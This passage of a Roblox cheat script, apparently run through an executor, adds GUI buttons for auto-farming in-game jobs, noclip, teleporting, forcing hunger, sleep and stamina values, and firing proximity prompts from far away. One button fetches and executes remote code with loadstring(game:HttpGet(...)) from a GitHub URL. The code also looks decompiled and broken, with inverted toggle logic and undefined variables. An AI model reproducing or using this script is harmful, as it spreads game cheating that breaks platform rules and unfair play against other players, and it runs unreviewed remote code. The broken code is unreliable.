    button.BackgroundColor3 = isEnabled
    if dishAutofarm then
        local localPlayer = game.Players.LocalPlayer
        local character = localPlayer.Character
        local humanoid = character:WaitForChild("Humanoid")
        local goToPickupPosition = Vector3.new(124, 5, 1258)
        local goToWashPosition = Vector3.new(125, 5, 1237)
        local pickupPlatePrompt = workspace.DishwasherJob.PickupPlates["Pick Up Plate"].ProximityPrompt
        local washDishPrompt = workspace.DishwasherJob.WashDish.WashDish.ProximityPrompt
        local placePlatePrompt = workspace.DishwasherJob.PlacePlates["Place Plate"].ProximityPrompt
        local startJobPrompt = workspace.DishwasherJob.StartJob["Start Job"].ProximityPrompt
        local plateDropoffPosition = Vector3.new(118, 5, 1268)
        local washDropoffPosition = Vector3.new(118, 5, 1263)
        local pathfindingService = game:GetService("PathfindingService"):CreatePath({
            AgentRadius = 2,
            AgentHeight = 5,
            AgentCanJump = true
        })
        local function moveToPosition(targetPosition)

            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
            pathfindingService:ComputeAsync(character.HumanoidRootPart.Position, targetPosition)
            if pathfindingService.Status == Enum.PathStatus.Success then
                for _, waypoint in ipairs(pathfindingService:GetWaypoints()) do
                    humanoid:MoveTo(waypoint.Position)
                    humanoid.MoveToFinished:Wait()
                end
            end
            game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
            task.wait(1.5)
        end
        local dishwasherTask = task.spawn(function()

            while dishAutofarm do
                local waitResult = task.wait()
                if waitResult then
                    local dirtyPlate = localPlayer.Backpack:FindFirstChild("DirtyPlate") or character:FindFirstChild("DirtyPlate")
                    if not dirtyPlate then
                        moveToPosition(goToPickupPosition)
                        fireproximityprompt(pickupPlatePrompt)
                        task.wait(pickupPlatePrompt.HoldDuration + 5)
                        dirtyPlate = localPlayer.Backpack:FindFirstChild("DirtyPlate") or character:FindFirstChild("DirtyPlate")
                        if not dirtyPlate then
                            local tweenService = game:GetService("TweenService"):Create(character.HumanoidRootPart,
                                TweenInfo.new(3, Enum.EasingStyle.Linear), {
                                    CFrame = CFrame.new(goToWashPosition)
                                })
                            tweenService:Play()
                            tweenService.Completed:Wait()
                            fireproximityprompt(startJobPrompt)
                            task.wait(startJobPrompt.HoldDuration + 5)
                        end
                    end
                    moveToPosition(plateDropoffPosition)
                    fireproximityprompt(washDishPrompt)
                    task.wait(washDishPrompt.HoldDuration + 5)
                    moveToPosition(washDropoffPosition)
                    fireproximityprompt(placePlatePrompt)
                    task.wait(placePlatePrompt.HoldDuration + 5)
                else
                    break
                end
            end
        end)
        task.spawn(function()

            while true do
                if task.wait() then
                    local isDishAutofarmEnabled = dishAutofarm
                    if not isDishAutofarmEnabled then
                        break
                    end
                end
                return
            end
            task.cancel(dishwasherTask)
            game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)

        end)

    end
end)
autofarmButton.MouseButton1Click:Connect(function()

    autofarm = not autofarm
    local button = autofarmButton
    local isEnabled = autofarm
    if isEnabled then
        isEnabled = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
    else

    end
    button.BackgroundColor3 = isEnabled
    local runServiceConnection = game:GetService("RunService").Stepped:Connect(function()

        if autofarm then
            for _, descendant in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.CanCollide = false
                end
            end
        end
    end)
    local function goToCratePosition()

        local humanoidRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
        local targetPosition = Vector3.new(156, 16, -324)
        local distance = (targetPosition - humanoidRootPart.Position).Magnitude
        if distance > 10 then
            local tweenService = game:GetService("TweenService"):Create(humanoidRootPart,
                TweenInfo.new(distance / 30, Enum.EasingStyle.Linear), {
                    CFrame = CFrame.new(targetPosition)
                })
            tweenService:Play()
            tweenService.Completed:Wait()
        end
    end
    local function performShelfJobActions()

        if autofarm then
            if not (game.Players.LocalPlayer.Character:FindFirstChild("Crate") or
                game.Players.LocalPlayer.Backpack:FindFirstChild("Crate")) then
                for _, shelfJobPart in pairs(workspace["Shelf Job"].StartJob:GetChildren()) do
                    if shelfJobPart.Name == "Start Job" and
                        (shelfJobPart.Position - Vector3.new(178.45367431640625, 0.8745189905166626, -337.9674072265625)).Magnitude <
                        0.1 then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(shelfJobPart.Position)
                        task.wait(0.1)
                        local startJobPrompt = shelfJobPart:FindFirstChild("ProximityPrompt")
                        startJobPrompt.RequiresLineOfSight = false
                        startJobPrompt.MaxActivationDistance = 5000
                        while startJobPrompt.ObjectText == "Start Job" do
                            local waitResult = task.wait(0.2)
                            if waitResult then
                                fireproximityprompt(startJobPrompt)
                            else
                                break
                            end
                        end
                        task.wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(156, 16, -324)
                        task.wait(0.1)
                        for _, cratePickupPart in pairs(workspace["Shelf Job"].CratePickups:GetChildren()) do
                            if cratePickupPart.Name == "Pick Up Crate" then
                                local pickupPrompt = cratePickupPart:FindFirstChild("ProximityPrompt")
                                pickupPrompt.RequiresLineOfSight = false
                                pickupPrompt.MaxActivationDistance = 5000
                                if pickupPrompt then
                                    fireproximityprompt(pickupPrompt)
                                    task.wait(1)
                                end
                            end
                        end
                    end
                end
            else
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(156, 16, -324)
                task.wait(0.1)
                for _, cratePickupPart in pairs(workspace["Shelf Job"].CratePickups:GetChildren()) do
                    if cratePickupPart.Name == "Pick Up Crate" then
                        local pickupPrompt = cratePickupPart:FindFirstChild("ProximityPrompt")
                        pickupPrompt.RequiresLineOfSight = false
                        pickupPrompt.MaxActivationDistance = 5000
                        if pickupPrompt then
                            fireproximityprompt(pickupPrompt)
                            task.wait(1)
                        end
                    end
                end
            end
        end
        while autofarm do
            local backpack = game.Players.LocalPlayer.Backpack
            local character = game.Players.LocalPlayer.Character
            local crate = backpack:FindFirstChild("Crate") or character:FindFirstChild("Crate")
            if crate and crate.Parent ~= character then
                crate.Parent = character
            end
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = autofarm
            if not character:FindFirstChild("Crate") then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(156, 16, -324))
                task.wait(0.1)
                for _, cratePickupPart in pairs(workspace["Shelf Job"].CratePickups:GetChildren()) do
                    if cratePickupPart.Name == "Pick Up Crate" then
local proximityPrompt = shelf.ProximityPrompt
                        proximityPrompt.RequiresLineOfSight = false
                        proximityPrompt.MaxActivationDistance = 5000
                        if proximityPrompt then
                            for i = 1, 3, 1 do
                                fireproximityprompt(proximityPrompt)
                                task.wait(0.1)
                            end
                        end
                    end
                end
            end
            task.wait(0.2)
            local shelvesToInteractWith = {}
            for _, shelf in pairs(workspace["Shelf Job"].ShelfPrompts:GetChildren()) do
                if shelf.Name == "Shelf" then
                    local shelfPosition = shelf.Position
                    if (shelfPosition - Vector3.new(169.23863220214844, 3.129215717315674, -319.00433349609375)).Magnitude < 0.1 or
                        (shelfPosition - Vector3.new(159.71566772460938, 5.461172103881836, -319.00433349609375)).Magnitude <
                        0.1 or
                        (shelfPosition - Vector3.new(169.23863220214844, 5.597635269165039, -319.00433349609375)).Magnitude <
                        0.1 then
                        table.insert(shelvesToInteractWith, shelf)
                    end
                end
            end
            if 0 < #shelvesToInteractWith and crateObject:FindFirstChild("Crate") then
                for _, shelf in ipairs(shelvesToInteractWith) do
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(shelf.Position +
                                                                                                Vector3.new(0, 9, 0))
                    for _, otherShelf in pairs(workspace["Shelf Job"].ShelfPrompts:GetChildren()) do
                        if otherShelf.Name == "Shelf" and (otherShelf.Position - shelf.Position).Magnitude < 10 then
                            local proximityPrompt = otherShelf:FindFirstChild("ProximityPrompt")
                            proximityPrompt.RequiresLineOfSight = false
                            proximityPrompt.MaxActivationDistance = 5000
                            if proximityPrompt then
                                for i = 1, 3, 1 do
                                    if crateObject:FindFirstChild("Crate") then
                                        fireproximityprompt(proximityPrompt)
                                        task.wait(0.05)
                                    else
                                        break
                                    end
                                end
                            end
                        end
                    end
                    if not crateObject:FindFirstChild("Crate") then
                        break
                    end
                end
            end
            task.wait(0.2)
        end
    end
    game.Players.LocalPlayer.CharacterAdded:Connect(function()

        if autofarmEnabled then
            task.wait(1)
            farmShelves()
            farmDishes()
        end
    end)
    farmShelves()
    farmDishes()
    if not autofarmEnabled then
        if stopFarmingConnection then
            stopFarmingConnection:Disconnect()
        end
        for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = autofarmEnabled
    end
end)
local function createToggle(button, colorLabel, valueName)

    local isToggled = false
    local valueChangedConnection = nil
    button.MouseButton1Click:Connect(function()

        isToggled = not isToggled
        local label = colorLabel
        local shouldBeGreen = isToggled
        if shouldBeGreen then
            shouldBeGreen = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
        else

        end
        label.BackgroundColor3 = shouldBeGreen
        if isToggled then
            local playerValue = game.Players.LocalPlayer.Character:FindFirstChild(valueName)
            if playerValue then
                valueChangedConnection = playerValue.Changed:Connect(function()

                    if playerValue.Value ~= 100 then
                        playerValue.Value = 100
                    end
                end)
            else
                warn("Value not found: " .. valueName)
            end

        elseif valueChangedConnection then
            valueChangedConnection:Disconnect()
        end
    end)
    return function()

        isToggled = false
        colorLabel.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        if valueChangedConnection then
            valueChangedConnection:Disconnect()
        end
    end
end
local isHungerAutofillEnabled = false
hungerButton.MouseButton1Click:Connect(function()

    isHungerAutofillEnabled = not isHungerAutofillEnabled
    local label = hungerColorLabel
    local shouldBeGreen = isHungerAutofillEnabled
    if shouldBeGreen then
        shouldBeGreen = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
    else

    end
    label.BackgroundColor3 = shouldBeGreen
    if isHungerAutofillEnabled then
        spawn(function()

            while isHungerAutofillEnabled do
                local waitResult = wait()
                if waitResult then
                    local hungerValue = game.Players.LocalPlayer:FindFirstChild("Hunger")
                    if hungerValue then
                        hungerValue = game.Players.LocalPlayer.Hunger
                        hungerValue.Value = "inf"
                    end
                else
                    break
                end
            end
        end)
    end
end)
local isSleepAutofillEnabled = false
sleepButton.MouseButton1Click:Connect(function()

    isSleepAutofillEnabled = not isSleepAutofillEnabled
    local label = sleepColorLabel
    local shouldBeGreen = isSleepAutofillEnabled
    if shouldBeGreen then
        shouldBeGreen = Color3.fromRGB(50, 255, 50) or Color3.fromRGB(255, 50, 50)
    else

    end
    label.BackgroundColor3 = shouldBeGreen
    if isSleepAutofillEnabled then
        spawn(function()

            while isSleepAutofillEnabled do
                local waitResult = wait()
                if waitResult then
                    local sleepValue = game.Players.LocalPlayer:FindFirstChild("Sleep")
                    if sleepValue then
                        sleepValue = game.Players.LocalPlayer.Sleep
                        sleepValue.Value = "inf"
                    end
                else
                    break
                end
            end
        end)
    end
end)
local resetStamina = createToggle(staminaButton, staminaColorLabel, "StaminaValue")
teleportToKitchenButton.MouseButton1Click:Connect(function()

    local TweenService = game:GetService("TweenService")
    local rootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
    TweenService:Create(rootPart,
        TweenInfo.new(((Vector3.new(147, 3, -332) - rootPart.Position)).Magnitude / 30, Enum.EasingStyle.Linear), {
            CFrame = CFrame.new(147, 3, -332)
        }):Play()
end)
teleportToFarmButton.MouseButton1Click:Connect(function()

    local TweenService = game:GetService("TweenService")
    local rootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
    TweenService:Create(rootPart,
        TweenInfo.new(((Vector3.new(304, 3, 137) - rootPart.Position)).Magnitude / 30, Enum.EasingStyle.Linear), {
            CFrame = CFrame.new(304, 3, 137)
        }):Play()
end)
teleportToShopButton.MouseButton1Click:Connect(function()

    local TweenService = game:GetService("TweenService")
    local rootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
    TweenService:Create(rootPart,
        TweenInfo.new(((Vector3.new(294, 3, 746) - rootPart.Position)).Magnitude / 30, Enum.EasingStyle.Linear), {
            CFrame = CFrame.new(294, 3, 746)
        }):Play()
end)
teleportToHouseButton.MouseButton1Click:Connect(function()

    local TweenService = game:GetService("TweenService")
    local rootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
    TweenService:Create(rootPart,
        TweenInfo.new(((Vector3.new(123, 5, 1259) - rootPart.Position)).Magnitude / 30, Enum.EasingStyle.Linear), {
            CFrame = CFrame.new(123, 5, 1259)
        }):Play()
end)
joinSmallServerButton.MouseButton1Click:Connect(function()

    loadstring(
        game:HttpGet("https://raw.githubusercontent.com/vermingov/UY-Scripts/refs/heads/main/JoinSmallServer.lua"))()
end)
local UserInputService = game:GetService("UserInputService")
local function toggleFly()

    flyToggle.Enabled = not flyToggle.Enabled
end
UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)

    if not gameProcessedEvent and input.KeyCode == Enum.KeyCode.RightShift then
        toggleFly()
    end
end)
stopButton.MouseButton1Click:Connect(function()

    autofarmEnabled = false
    dishAutofarm = false
    stopFarmButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    dishAutofarmButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    local LocalPlayer = game.Players.LocalPlayer
    if LocalPlayer.Character then
        LocalPlayer.Character.HumanoidRootPart.Anchored = false
    end
    resetStamina()
    if stopFarmingConnection then
        stopFarmingConnection:Disconnect()
        stopFarmingConnection = nil
    end
    flyToggle:Destroy()
    script:Destroy()
end)